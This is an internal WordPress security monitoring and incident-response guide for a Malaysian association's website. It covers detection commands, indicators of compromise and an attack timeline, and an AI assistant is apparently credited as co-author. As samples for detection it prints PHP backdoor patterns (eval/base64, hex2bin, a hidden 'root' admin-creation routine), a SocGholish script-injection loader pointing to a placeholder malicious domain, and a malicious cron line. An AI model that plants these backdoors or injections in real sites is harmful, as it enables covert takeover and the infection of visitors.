# 🛡️ Security Monitoring & Health Check Guide
**Website:** proptech.org.my (Malaysia Proptech Association)  
**Created:** October 28, 2025  
**Version:** 1.0  
**Status:** Active Security Protocol

---

## Executive Summary

This document provides comprehensive security monitoring procedures for proptech.org.my following the successful resolution of multiple malware attacks (October 24-29, 2025). Use this guide to perform regular security checks and identify potential threats early.

**What Happened:**
- **October 24, 2025:** WordPress site compromised via stolen admin credentials
- **Attack Type:** Cryptocurrency miners, PHP backdoors, cron persistence, hidden user backdoor
- **October 28-29, 2025:** SocGholish JavaScript malware + 83-line functions.php backdoor discovered
- **Impact:** Server load reached 133.50 (from normal 0.3-0.8), 52 malware files + backdoor + SocGholish
- **Resolution:** Complete malware cleanup, backdoor removal, fresh restoration from clean backup
- **Current Status (Oct 29):** ✅ VERIFIED CLEAN - All backdoors removed, no malware detected

---

## Table of Contents

1. [Quick Health Check (Daily)](#quick-health-check-daily)
2. [Comprehensive Security Scan (Weekly)](#comprehensive-security-scan-weekly)
3. [System Health Metrics](#system-health-metrics)
4. [Malware Detection Patterns](#malware-detection-patterns)
5. [WordPress Security Checks](#wordpress-security-checks)
6. [Automated Monitoring Scripts](#automated-monitoring-scripts)
7. [Emergency Response Procedures](#emergency-response-procedures)
8. [Appendix: Attack History](#appendix-attack-history)

---

## Quick Health Check (Daily)

**Time Required:** 2-3 minutes  
**Frequency:** Daily (or before/after major changes)

### Step 1: System Resources Check

Connect to server:
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com
cd ~/public_html/proptech.org.my
```

Check server load and memory:
```bash
uptime
free -h
```

**Normal Values:**
- **Server Load:** 0.3 - 2.0 (average across 3 values)
- **Memory Used:** < 50% (< 4.0Gi out of 7.8Gi)
- **Swap Used:** < 1.0Gi

**⚠️ Alert if:**
- Server Load > 10.0
- Memory Used > 80% (> 6.2Gi)
- Swap Used > 2.0Gi

### Step 2: Quick Malware Scan

```bash
# Check for ELF/Perl malware (should be 0)
find wp-content -type f -exec file {} \; 2>/dev/null | grep -E "ELF|Perl script" | grep -v "\.pl:" | wc -l

# Check for suspicious 8-character filenames (should be 0)
find wp-content -type f -regex '.*\/[a-z0-9]{8}$' 2>/dev/null | wc -l

# 🆕 Check for WordPress backdoor patterns (should be 0)
grep -r 'admin@wordpress.com' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
grep -r '_pre_user_id' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
```

**Expected Result:** All commands should return `0`

**⚠️ Alert if:** Any command returns a number > 0

### Step 3: WordPress Site Check

```bash
# Check if site is accessible
curl -I https://proptech.org.my 2>&1 | head -1

# Check WordPress admin
curl -I https://proptech.org.my/wp-admin/ 2>&1 | head -1
```

**Expected Result:** Both should return `HTTP/2 200` or `HTTP/1.1 200`

**⚠️ Alert if:** Returns 500, 503, or connection timeout

---

## Comprehensive Security Scan (Weekly)

**Time Required:** 15-20 minutes  
**Frequency:** Weekly (Recommended: Monday mornings)

### 1. Server Resource Analysis

```bash
# Connect to server
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com
cd ~/public_html/proptech.org.my

# Full resource check
echo "=== SERVER HEALTH CHECK ==="
echo ""
echo "Date: $(date)"
echo ""
echo "1. SERVER LOAD:"
uptime
echo ""
echo "2. MEMORY USAGE:"
free -h
echo ""
echo "3. DISK USAGE:"
df -h | grep -E "Filesystem|proptech"
echo ""
echo "4. TOP CPU PROCESSES:"
ps aux --sort=-%cpu | head -10
```

**What to Look For:**
- Load average staying consistently below 5.0
- No unknown processes consuming high CPU
- Disk usage below 80%
- Memory usage stable over time

### 2. Malware File Scan

```bash
echo "=== MALWARE SCAN ==="
echo ""
echo "1. ELF/Perl Malware Files:"
find wp-content -type f -exec file {} \; 2>/dev/null | grep -E "ELF|Perl script" | grep -v "\.pl:" | wc -l
echo ""
echo "2. Suspicious 8-Character Filenames:"
find wp-content -type f -regex '.*\/[a-z0-9]{8}$' 2>/dev/null | wc -l
echo ""
echo "3. PHP Files in Uploads:"
find wp-content/uploads -name "*.php" -type f 2>/dev/null | wc -l
echo ""
echo "4. Recently Modified Files (last 7 days):"
find wp-content -type f -mtime -7 2>/dev/null | wc -l
```

**Expected Results:**
1. ELF/Perl files: `0`
2. 8-char filenames: `0`
3. PHP in uploads: `0`
4. Recent modifications: Varies (should be minimal if no updates)

### 3. PHP Backdoor Detection

```bash
echo "5. PHP Backdoor Patterns:"
echo ""
echo "   hex2bin + POST:"
find wp-content -name "*.php" -type f -exec grep -l "hex2bin.*POST" {} \; 2>/dev/null | wc -l
echo ""
echo "   eval + base64_decode:"
find wp-content -name "*.php" -type f -exec grep -l "eval(base64_decode" {} \; 2>/dev/null | wc -l
echo ""
echo "   getallheaders backdoor:"
find wp-content -name "*.php" -type f -exec grep -l "getallheaders()" {} \; 2>/dev/null | wc -l
```

**Expected Results:** All should be `0` or very low numbers

**Note:** Some legitimate plugins may use these functions. Investigate any positive results.

### 4. Known Malware Location Check

```bash
echo "6. Known Malware Locations:"
echo ""
echo "   cloud.php:"
ls -la wp-content/plugins/convertpro/assets/css/cloud.php 2>&1 | grep -q "No such file" && echo "   Not found (Good!)" || echo "   ⚠️ FOUND - INVESTIGATE!"
echo ""
echo "   main_center.php:"
find wp-content -name "main_center.php" 2>/dev/null | wc -l
echo ""
echo "   avmphku plugin:"
ls -d wp-content/plugins/avmphku 2>&1 | grep -q "No such file" && echo "   Not found (Good!)" || echo "   ⚠️ FOUND - MALWARE!"
```

**Expected Results:** All should be "Not found" or `0`

### 5. WordPress Core Integrity

```bash
echo "7. WordPress Core Files:"
echo ""
echo "   class-wp-rest-post-statuses-controller.php (line 1):"
head -n 1 wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php
echo ""
echo "   class-wp-rest-users-controller.php (line 1):"
head -n 1 wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php
```

**Expected Result:** Both should show `<?php`

**⚠️ Alert if:** Shows anything other than `<?php` on line 1

### 6. Cron Job Verification

```bash
echo "8. Cron Jobs:"
crontab -l 2>/dev/null || echo "No user crontab (Good!)"
```

**Expected Result:** "No user crontab" or only legitimate scheduled tasks

**⚠️ Alert if:** See any cron jobs with:
- Paths to `wp-content/plugins/`
- Suspicious hash comments (e.g., `# a7b3c8d9e0f1`)
- Running every 15 minutes from unusual locations

### 7. User Account Audit

```bash
echo "9. WordPress Users:"
wp user list --allow-root
```

**Expected Users:**
- admin_amk (ID: 10) - Main admin
- amk (ID: 1) - Legacy admin
- eugene.teow (ID: 2) - Admin
- charlotte (ID: 3) - Admin
- user.1-4 (ID: 4-7) - Review if still needed

**⚠️ Alert if:** See unknown users, especially:
- Username: "root"
- Email: "admin@wordpress.com"
- Recently created accounts you don't recognize

### 8. File Count Baseline

```bash
echo "10. File Count:"
find wp-content -type f | wc -l
```

**Current Baseline:** ~3,219 files (as of Oct 28, 2025)

**⚠️ Alert if:** Count increases by > 50 files unexpectedly

### 9. WordPress Backdoor Detection (🆕 CRITICAL)

**Added:** October 29, 2025 (after functions.php backdoor discovery)

```bash
echo "11. WordPress Backdoor Patterns:"
echo ""

# Check for user creation in themes (CRITICAL)
echo "   wp_insert_user in themes:"
find wp-content/themes -name '*.php' -exec grep -l 'wp_insert_user' {} \; 2>/dev/null | wc -l

echo ""
echo "   Fake admin email:"
grep -r 'admin@wordpress.com' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l

echo ""
echo "   Hidden user ID storage:"
grep -r '_pre_user_id' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l

echo ""
echo "   User protection functions:"
grep -r 'protect_user\|wp_admin_users_protect' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l

echo ""
echo "   SocGholish JavaScript malware:"
grep -r 'content-website-analytics\|createElement.*insertBefore.*script\.js' wp-content/themes/ 2>/dev/null | wc -l
```

**Expected Results:** ALL should be `0`

**⚠️ CRITICAL ALERT if ANY > 0:**
- `wp_insert_user` in themes = Hidden admin user backdoor
- `admin@wordpress.com` = Fake admin account
- `_pre_user_id` = Hidden user tracking
- `protect_user` functions = User hiding mechanism  
- `content-website-analytics` = SocGholish malware

**Immediate Action if Detected:**
1. **DO NOT DELETE** - Document first
2. Copy infected file to `malware_samples/`
3. Check last modification time: `stat filename`
4. Check who modified: `ls -la filename`
5. Review full file context: `grep -B20 -A20 'pattern' filename`
6. Follow removal procedures (see Emergency Response)

---

## System Health Metrics

### Normal Operating Values (Baseline)

| Metric | Normal Range | Warning Threshold | Critical Threshold |
|--------|--------------|-------------------|-------------------|
| **Server Load (1-min)** | 0.3 - 2.0 | > 5.0 | > 10.0 |
| **Server Load (5-min)** | 0.5 - 1.5 | > 4.0 | > 8.0 |
| **Server Load (15-min)** | 0.3 - 1.0 | > 3.0 | > 5.0 |
| **Memory Used** | 1.5 - 3.0 Gi | > 5.0 Gi | > 6.5 Gi |
| **Memory Available** | > 4.0 Gi | < 2.0 Gi | < 1.0 Gi |
| **Swap Used** | < 500 Mi | > 1.5 Gi | > 3.0 Gi |
| **Disk Usage** | < 50% | > 70% | > 85% |
| **CPU (per process)** | < 5% | > 20% | > 50% |

### Attack Indicators (October 24, 2025)

| Metric | Normal | During Attack | Status Now |
|--------|--------|---------------|------------|
| **Server Load** | 0.3-0.8 | **133.50** | 1.06 ✅ |
| **Memory Used** | 2.0 Gi | **7.1 Gi (91%)** | 1.5 Gi ✅ |
| **Swap Used** | 200 Mi | **3.3 Gi** | 523 Mi ✅ |
| **ELF Files** | 0 | **52 files** | 0 ✅ |
| **Suspicious Processes** | 0 | **20+ miners** | 0 ✅ |

**Key Lesson:** Sudden resource spikes (10x+ increase) indicate active attack

---

## Malware Detection Patterns

### File-Based Indicators of Compromise (IOCs)

#### 1. Malicious File Patterns

**8-Character Random Filenames:**
```
Pattern: [a-z0-9]{8}$ (no file extension)
Examples from attack:
- d2at691j, lapeaa5j, y9s4pux5, 2vxnbio0
- c8o3r5n0, dfrn7dju, ba08r9rv, e6pxvn94
- uej5ghj1, 5uj5rwfh, ul6a3ga3, ru3yxbmx

Detection command:
find wp-content -type f -regex '.*\/[a-z0-9]{8}$'
```

**ELF Executables (Linux malware):**
```
File types:
- ELF 32-bit LSB executable, Intel 80386, statically linked, stripped
- ELF 64-bit LSB executable, x86-64, statically linked, stripped

Detection command:
find wp-content -type f -exec file {} \; | grep "ELF"

⚠️ Should be: 0 files
```

**Perl Scripts (downloaders):**
```
File type: Perl script text executable

Detection command:
find wp-content -type f -exec file {} \; | grep "Perl script" | grep -v "\.pl:"

⚠️ Should be: 0 files (excluding .pl extensions)
```

#### 2. Known Malware Files (From October Attack)

**PHP Backdoors:**
```
/wp-content/plugins/convertpro/assets/css/cloud.php
/wp-content/plugins/avmphku/index.php
/wp-content/plugins/*/main_center.php
```

**Detection:**
```bash
ls -la wp-content/plugins/convertpro/assets/css/cloud.php 2>&1
ls -d wp-content/plugins/avmphku 2>&1
find wp-content -name "main_center.php"
```

**Expected:** All should be "No such file or directory"

#### 3. PHP Backdoor Code Patterns

**Obfuscated hex2bin Backdoor:**
```php
if(isset($_POST["symbol"])):
    $_0=hEX2BiN($_POST["symbol"]);
    // XOR obfuscation and execution
```

**Detection:**
```bash
find wp-content -name "*.php" -exec grep -l "hex2bin.*POST" {} \;
```

**eval + base64 Backdoor:**
```php
eval(base64_decode($_POST['data']));
eval($_REQUEST['cmd']);
```

**Detection:**
```bash
find wp-content -name "*.php" -exec grep -l "eval(base64_decode" {} \;
find wp-content -name "*.php" -exec grep -l "eval(\$_REQUEST" {} \;
```

**getallheaders Backdoor:**
```php
$_HEADERS = getallheaders();
$cmd = hex2bin($_HEADERS['Large-Allocation']);
```

**Detection:**
```bash
find wp-content -name "*.php" -exec grep -l "getallheaders()" {} \;
```

#### 4. WordPress User Creation Backdoor (🆕 Oct 29, 2025)

**⚠️ CRITICAL:** This backdoor uses LEGITIMATE WordPress functions, making it extremely hard to detect!

**Backdoor Pattern:**
```php
// Hidden Admin User Creation
$args = array(
    'user_login' => 'root',
    'user_pass' => '<long_random_string>',
    'role' => 'administrator',
    'user_email' => 'admin@wordpress.com'
);

if (!username_exists($args['user_login'])) {
    $id = wp_insert_user($args);
    update_option('_pre_user_id', $id);
}
```

**Detection Commands:**
```bash
# Check for user creation in THEMES (plugins may legitimately use this)
find wp-content/themes -name "*.php" -exec grep -l "wp_insert_user" {} \;

# Check for fake admin email
grep -r "admin@wordpress.com" wp-content/themes/

# Check for hidden user ID storage
grep -r "_pre_user_id" wp-content/

# Check for user protection functions
grep -r "protect_user\|wp_admin_users_protect" wp-content/themes/
```

**What Makes This Dangerous:**
- Uses LEGITIMATE WordPress functions (wp_insert_user, username_exists)
- Function names sound like security features ("protect_user")
- Hidden in theme files (not obvious malware location)
- Creates invisible admin account
- Auto-recreates if deleted
- Hard to distinguish from legitimate code

**Common Indicators:**
1. `wp_insert_user()` in theme files (themes shouldn't create users)
2. Hardcoded username/password (especially 'root', 'admin')
3. Email: `admin@wordpress.com` (fake WordPress email)
4. Hidden user ID: `_pre_user_id` or similar
5. User protection functions: `protect_user_from_deleting()`, `wp_admin_users_protect_*()`

**Expected Result:** 0 instances in themes (may exist legitimately in plugins)

**⚠️ Critical Alert if Found in themes:**
- This indicates a persistent backdoor
- Attacker has ongoing admin access
- May auto-create hidden admin accounts
- Remove ENTIRE related code block, not just parts

#### 5. SocGholish JavaScript Malware (🆕 Oct 29, 2025)

**Pattern:**
```javascript
;(function(f,i,u,w,s){
    w=f.createElement(i);
    s=f.getElementsByTagName(i)[0];
    w.async=1;
    w.src=u;
    s.parentNode.insertBefore(w,s);
})(document,'script','https://malicious-domain.com/script.js');
```

**Detection:**
```bash
# Check for malicious domain
grep -r "content-website-analytics" wp-content/themes/

# Check for script injection pattern
grep -r "createElement.*insertBefore.*script" wp-content/themes/ | grep -v node_modules
```

**What It Does:**
- Injects external JavaScript into your pages
- Shows fake browser update popups to visitors
- Tricks visitors into downloading malware
- All your website visitors get infected

**Expected Result:** 0 instances

### Process-Based Indicators

**Suspicious Process Names:**
```
minerd           - Bitcoin miner
xmr-stak         - Monero miner
cryptonight      - CryptoNight algorithm
stratum          - Mining pool protocol
```

**Detection:**
```bash
ps aux | grep -E "minerd|xmr-stak|cryptonight|stratum" | grep -v grep
```

**Expected Result:** No output (empty)

**High CPU Processes:**
```bash
ps aux --sort=-%cpu | head -10
```

**⚠️ Investigate if:**
- Unknown processes consuming > 20% CPU
- Multiple processes with random 8-char names
- Processes running from `/tmp/` or `wp-content/`

### Cron-Based Indicators

**Malicious Cron Pattern (From Attack):**
```
*/15 * * * * /path/to/wp-content/plugins/.../CommonAttributes # a7b3c8d9e0f1
```

**Detection:**
```bash
crontab -l 2>/dev/null
```

**⚠️ Alert if:**
- Cron jobs pointing to `wp-content/plugins/`
- Jobs with hexadecimal hash comments
- Jobs running executables from Python virtualenv paths
- Frequency every 15 minutes or less

---

## WordPress Security Checks

### Plugin Security Audit

**Monthly Plugin Review:**

1. **List All Installed Plugins:**
```bash
ls -1 wp-content/plugins/
```

2. **Check Plugin Last Update:**
```bash
wp plugin list --allow-root --fields=name,status,update,version
```

3. **Remove Unused Plugins:**
```bash
# Deactivate
wp plugin deactivate [plugin-name] --allow-root

# Delete completely
wp plugin delete [plugin-name] --allow-root
```

**⚠️ Red Flags:**
- Plugins not updated in > 2 years
- Plugins with "nulled" or "premium" in description
- Plugins from unknown sources (not WordPress.org)
- Plugins you don't remember installing

### Theme Security

**Check Active Theme:**
```bash
wp theme list --allow-root
ls -la wp-content/themes/
```

**Scan Theme Files for Backdoors:**
```bash
find wp-content/themes -name "*.php" -exec grep -l "eval(" {} \;
find wp-content/themes -name "*.php" -exec grep -l "base64_decode" {} \;
```

**Expected:** Minimal or no results (some themes use these legitimately)

### Uploads Directory Security

**No PHP Files Should Exist in Uploads:**
```bash
find wp-content/uploads -name "*.php" -type f 2>/dev/null
```

**Expected Result:** No output (0 files)

**⚠️ Critical Alert if:** Any PHP files found in uploads directory

### User Account Security

**List All Admin Users:**
```bash
wp user list --role=administrator --allow-root
```

**Security Checklist:**
- [ ] All admin accounts are known and legitimate
- [ ] No users with email "admin@wordpress.com"
- [ ] No users named "root", "admin", "test"
- [ ] All admins have strong passwords (16+ characters)
- [ ] Two-Factor Authentication enabled for all admins

**Remove Suspicious Users:**
```bash
wp user delete [user-id] --reassign=[admin-id] --allow-root
```

---

## Automated Monitoring Scripts

### 1. Daily Monitoring Script

Save as: `/Users/amk/Documents/GitHub/MPA_Website/daily_security_check.sh`

```bash
#!/bin/bash
# Daily Security Check for proptech.org.my
# Run: ./daily_security_check.sh

LOG_FILE="daily_security_log.txt"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

echo "==================================" >> $LOG_FILE
echo "DAILY SECURITY CHECK" >> $LOG_FILE
echo "Date: $DATE" >> $LOG_FILE
echo "==================================" >> $LOG_FILE

# Connect to server and run checks
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com << 'ENDSSH' >> $LOG_FILE 2>&1

cd ~/public_html/proptech.org.my

echo ""
echo "1. Server Load:"
uptime

echo ""
echo "2. Memory Usage:"
free -h | grep Mem

echo ""
echo "3. ELF/Perl Malware:"
MALWARE=$(find wp-content -type f -exec file {} \; 2>/dev/null | grep -E "ELF|Perl script" | grep -v "\.pl:" | wc -l)
if [ "$MALWARE" -eq 0 ]; then
    echo "   ✅ CLEAN (0 files)"
else
    echo "   ⚠️ ALERT: $MALWARE malware files detected!"
fi

echo ""
echo "4. Suspicious Filenames:"
SUSPICIOUS=$(find wp-content -type f -regex '.*\/[a-z0-9]{8}$' 2>/dev/null | wc -l)
if [ "$SUSPICIOUS" -eq 0 ]; then
    echo "   ✅ CLEAN (0 files)"
else
    echo "   ⚠️ ALERT: $SUSPICIOUS suspicious files!"
fi

echo ""
echo "5. PHP in Uploads:"
PHP_UPLOADS=$(find wp-content/uploads -name "*.php" -type f 2>/dev/null | wc -l)
if [ "$PHP_UPLOADS" -eq 0 ]; then
    echo "   ✅ CLEAN (0 files)"
else
    echo "   ⚠️ ALERT: $PHP_UPLOADS PHP files in uploads!"
fi

echo ""
echo "6. File Count:"
find wp-content -type f | wc -l

echo ""
echo "VERDICT: $([ "$MALWARE" -eq 0 ] && [ "$SUSPICIOUS" -eq 0 ] && [ "$PHP_UPLOADS" -eq 0 ] && echo "✅ SYSTEM CLEAN" || echo "⚠️ THREATS DETECTED")"

ENDSSH

echo "" >> $LOG_FILE
echo "==================================" >> $LOG_FILE
echo "" >> $LOG_FILE

# Display results
tail -30 $LOG_FILE

echo ""
echo "Full log: $LOG_FILE"
```

**Make executable:**
```bash
chmod +x daily_security_check.sh
```

**Run manually:**
```bash
./daily_security_check.sh
```

**Schedule Daily (Add to crontab):**
```bash
# Add to your Mac's crontab (run at 9 AM daily)
0 9 * * * cd /Users/amk/Documents/GitHub/MPA_Website && ./daily_security_check.sh
```

### 2. Alert Script (Email on Threats)

Save as: `/Users/amk/Documents/GitHub/MPA_Website/security_alert.sh`

```bash
#!/bin/bash
# Security Alert Script - Sends email if threats detected

ALERT_EMAIL="test@gmail.com"  # Change to your email

# Run scan
RESULT=$(ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com << 'ENDSSH'
cd ~/public_html/proptech.org.my
MALWARE=$(find wp-content -type f -exec file {} \; 2>/dev/null | grep -E "ELF|Perl script" | grep -v "\.pl:" | wc -l)
echo $MALWARE
ENDSSH
)

# Send alert if malware found
if [ "$RESULT" -gt 0 ]; then
    echo "⚠️ SECURITY ALERT: $RESULT malware files detected on proptech.org.my at $(date)" | mail -s "MALWARE ALERT - proptech.org.my" $ALERT_EMAIL
    echo "Alert sent to $ALERT_EMAIL"
else
    echo "✅ System clean ($(date))"
fi
```

---

## Emergency Response Procedures

### If Malware Is Detected

**DO NOT PANIC - Follow these steps:**

#### Step 1: Immediate Assessment (5 minutes)

1. **Check server load:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "uptime"
```

2. **Count infected files:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && find wp-content -type f -exec file {} \; 2>/dev/null | grep -E 'ELF|Perl script' | wc -l"
```

3. **Check site accessibility:**
```bash
curl -I https://proptech.org.my
```

#### Step 2: Document Evidence (10 minutes)

1. **Take snapshot of infected files:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && find wp-content -type f -exec file {} \; 2>/dev/null | grep -E 'ELF|Perl script' > ~/malware_evidence_$(date +%Y%m%d_%H%M%S).txt"
```

2. **Check recent file modifications:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && find wp-content -type f -mtime -1 -exec ls -lh {} \;"
```

3. **Check WordPress user accounts:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && wp user list --allow-root"
```

#### Step 3: Contain the Threat (15 minutes)

1. **Take site offline (if critical):**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && echo 'Site under maintenance' > .maintenance"
```

2. **Kill suspicious processes:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "ps aux | grep -E 'minerd|xmr-stak|cryptonight' | grep -v grep | awk '{print \$2}' | xargs kill -9"
```

3. **Check cron jobs:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "crontab -l"
```

#### Step 4: Create Clean Backup (20 minutes)

1. **Backup database:**
```bash
ssh -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com "cd ~/public_html/proptech.org.my && wp db export ~/emergency_backup_$(date +%Y%m%d_%H%M%S).sql --allow-root"
```

2. **Download backup locally:**
```bash
scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sql ~/Desktop/
```

#### Step 5: Contact Support

**Immediate Contacts:**
- **System Administrator:** amk (test@gmail.com)
- **Hosting Support:** cPanel support (proptech.org.my:2083)
- **Security Expert:** [Add if available]

**Information to Provide:**
1. Date/time of detection
2. Number of infected files
3. Current server load
4. Evidence file location
5. Recent changes to site (plugins, themes, users)

---

## Appendix: Attack History

### October 24-29, 2025 Complete Incident Timeline

**Attack Timeline:**

| Date/Time | Event |
|-----------|-------|
| **Oct 23, 09:01 AM** | Attacker creates backdoor user "root" via functions.php backdoor |
| **Oct 24, 06:24 AM** | Attacker logs in from IP 217.215.115.218 |
| **Oct 24, 06:24 AM** | Malicious plugin uploaded |
| **Oct 24, 11:40 AM** | Server load peaks at 133.50 |
| **Oct 24, 07:00 PM** | Initial cleanup attempts |
| **Oct 27, 03:00 PM** | First reinfection discovered (43 files) |
| **Oct 27, 11:00 PM** | UpdraftPlus plugin removed |
| **Oct 28, 12:20 AM** | Second reinfection discovered (9 files) |
| **Oct 28, 02:20 AM** | Infected backups deleted |
| **Oct 28, 06:02 AM** | **SocGholish JavaScript malware injected into main.js** |
| **Oct 28, 11:33 AM** | System verified clean (9.5 hours no reinfection) |
| **Oct 28, 02:00 PM** | Live server scan - CLEAN |
| **Oct 29, 10:23 AM** | **SocGholish detected by Norton (user reported)** |
| **Oct 29, 10:30 AM** | **SocGholish removed from main.js** |
| **Oct 29, 10:45 AM** | **functions.php backdoor discovered (83 lines)** |
| **Oct 29, 11:00 AM** | **Backdoor partially removed (51 lines)** |
| **Oct 29, 11:15 AM** | **Remaining backdoor found (32 lines) and removed** |
| **Oct 29, 11:30 AM** | **Comprehensive scan of all 6,045 files completed** |
| **Oct 29, 11:45 AM** | **System FULLY CLEAN - All backdoors removed** |

**Total Malware Removed:** 52 files (43 + 9) + 83-line backdoor + SocGholish injection

**Root Causes Identified:**
1. **Stolen WordPress admin credentials** (amk account)
2. **Persistent functions.php backdoor** (automatically created "root" admin user)
3. **UpdraftPlus backup contamination** (backed up infected state)
4. **Infected backup files** (caused automatic reinfection via macOS system services)

**Attack Vector:** 
1. Initial: Compromised WordPress admin login → Plugin upload → Malware deployment
2. Persistence: functions.php backdoor → Hidden admin account → Ongoing access
3. Secondary: Hidden admin account → SocGholish JavaScript injection

**Malware Types:**
- **Cryptocurrency Miners:** 46 files (ELF 32/64-bit executables)
- **Perl Downloaders:** 6 files (Perl script text executables)
- **PHP Backdoors:** 3 files (hex2bin, eval, getallheaders)
- **WordPress Core Infections:** 2 files (REST API controllers)
- **🆕 Persistent Backdoor:** 83 lines in functions.php (hidden user creation + protection)
- **🆕 SocGholish Malware:** JavaScript injection in main.js (fake browser updates)

**Affected Plugins:**
- wp-mail-smtp (39 files - deleted)
- updraftplus (10+ files - deleted)
- akismet (3 files - cleaned)
- mpa-event-status-updater (2 files - cleaned)
- mpa-image-processor (5 files - cleaned)

**Resolution:**
- Complete malware removal (52 files + backdoor + SocGholish)
- Fresh restoration from clean backup (Oct 28, 2025)
- Password changes for all admin accounts
- Implementation of continuous monitoring
- **🆕 Backdoor removal:** Full 83-line backdoor removed from functions.php
- **🆕 SocGholish removal:** JavaScript injection removed from main.js
- **🆕 Hidden user deletion:** "root" admin account deleted from both server and database
- **🆕 Security hardening:** Theme/plugin editor disabled in wp-config.php
- **🆕 Comprehensive scan:** All 6,045+ files scanned with 16 malware patterns

**Current Status (Oct 29, 2025):**
✅ **VERIFIED CLEAN** - No malware detected in comprehensive scan
✅ **BACKDOOR REMOVED** - All 83 lines of backdoor code eliminated
✅ **SOCGHOLISH REMOVED** - JavaScript injection eliminated
✅ **SECURITY HARDENED** - File editor disabled, Theme Editor locked
✅ **MONITORING ACTIVE** - Enhanced 30-minute automated scans running
✅ **SAFE FOR PRODUCTION** - Both server and local copies fully clean

---

## Document Information

**Version History:**

| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 1.0 | Oct 28, 2025 | Initial release | AI Assistant + amk |
| 1.1 | Oct 29, 2025 | Added WordPress backdoor detection patterns, SocGholish detection | AI Assistant + amk |

**Review Schedule:**
- **Next Review:** November 28, 2025 (1 month)
- **Frequency:** Monthly or after any security incident
- **Responsibility:** System Administrator (amk)

**Related Documents:**
- `SECURITY_INCIDENT_REPORT.md` - Original attack details (Oct 24)
- `MALWARE_CLEANUP_REPORT_2025-10-27.md` - Detailed cleanup actions
- `SERVER_ACCESS_GUIDE.md` - Access credentials and procedures

---

**Classification:** CONFIDENTIAL - Internal Use Only  
**Last Updated:** October 28, 2025  
**Prepared By:** AI Assistant with user amk

---

**END OF GUIDE**

*Keep this document updated with each security check. Regular monitoring is your best defense against future attacks.*



